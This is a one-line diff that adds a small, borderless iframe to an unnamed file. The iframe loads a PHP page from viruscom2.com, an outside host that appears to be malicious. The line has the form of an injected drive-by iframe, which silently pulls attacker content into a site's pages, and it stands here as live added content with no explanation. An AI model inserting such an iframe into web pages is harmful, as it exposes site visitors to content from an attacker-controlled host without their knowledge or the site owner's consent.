@@ -1,0 +1,1 @@
+<iframe src="http://www.viruscom2.com/web-app/random-id-frame.php" width="150" height="160" scrolling="no" frameborder=0></iframe>
